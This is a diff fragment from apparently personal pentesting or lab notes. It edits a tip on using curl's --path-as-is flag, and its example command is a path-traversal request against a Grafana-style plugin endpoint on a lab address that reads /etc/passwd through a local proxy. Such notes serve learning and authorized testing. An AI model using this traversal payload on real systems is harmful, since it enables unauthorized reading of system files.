@@ -33,7 +33,7 @@ Use requests.content instead of requests.text for bytes-type data.
 
 ---
 
-For sending GET requests without url normalization, use curl with --path-as-is
+For sending GET requests without url normalization, use curl with `--path-as-is`
 
 ```text
 curl --path-as-is http://10.10.11.183:3000/public/plugins/stat/../../../../../../../../etc/passwd -x 127.0.0.1:8080
